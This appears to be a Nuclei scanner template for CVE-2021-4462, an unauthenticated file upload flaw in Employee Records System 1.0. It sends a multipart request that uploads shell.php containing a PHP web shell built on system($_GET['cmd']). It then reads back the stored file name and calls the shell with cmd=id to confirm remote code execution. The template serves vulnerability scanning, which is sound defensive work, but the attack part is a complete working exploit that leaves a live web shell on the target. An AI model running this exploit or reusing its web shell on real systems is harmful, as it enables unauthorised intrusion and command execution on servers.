id: employee-records-rce-fileupload-cve-2021-4462

info:
  name: Employee Records System File Upload RCE (CVE-2021-4462)
  author: nikhilpatidar01
  severity: critical
  description: Unauthenticated unrestricted file upload leading to RCE in Employee Records System 1.0.
  reference:
    - https://www.exploit-db.com/exploits/49596

requests:
  - raw:
      - |
        POST /dashboard/uploadID.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=-----------------------1337
        Accept: */*
        
        -------------------------1337
        Content-Disposition: form-data; name="employee_ID"; filename="shell.php"
        Content-Type: application/x-php
        
        <?php echo "nuclei_rce_test:"; system($_GET['cmd']); ?>
        -------------------------1337--
    matchers:
      - type: word
        part: body
        words:
          - ".php"
    extractors:
      - type: regex
        part: body
        regex:
          - '"upload_filename":"([^"]+)"'
    attack: pitchfork

  - method: GET
    path:
      - "/uploads/employees_ids/{{extractor_1}}?cmd=id"
    matchers:
      - type: word
        words:
          - "nuclei_rce_test"
          - "uid="
        condition: and
